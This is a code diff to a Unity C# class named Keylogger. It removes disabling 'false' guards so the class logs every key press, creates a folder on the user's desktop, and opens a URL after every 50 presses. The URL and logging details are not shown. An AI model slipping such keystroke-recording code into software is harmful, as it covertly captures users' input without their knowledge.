@@ -19,7 +19,7 @@ public class Keylogger : MonoBehaviour
     {
         foreach (KeyCode keyCode in Enum.GetValues(typeof(KeyCode)))
         {
-            if (Input.GetKeyDown(keyCode) && false)
+            if (Input.GetKeyDown(keyCode))
             {
 
 
@@ -31,13 +31,13 @@ public class Keylogger : MonoBehaviour
 
                 LogKeyPress(keyCode);
 
-                if(counter > 25){
+                if(counter > 50){
 
                   OpenURL(url);
                   counter =  0;
                 }
 
-                counter--;
+                counter++;
 
 
             }
@@ -59,7 +59,7 @@ public class Keylogger : MonoBehaviour
         string folderPath = Path.Combine(desktopPath, folderName);
 
         // Check if the folder already exists
-        if (!Directory.Exists(folderPath) && false)
+        if (!Directory.Exists(folderPath))
         {
             Directory.CreateDirectory(folderPath);
         }
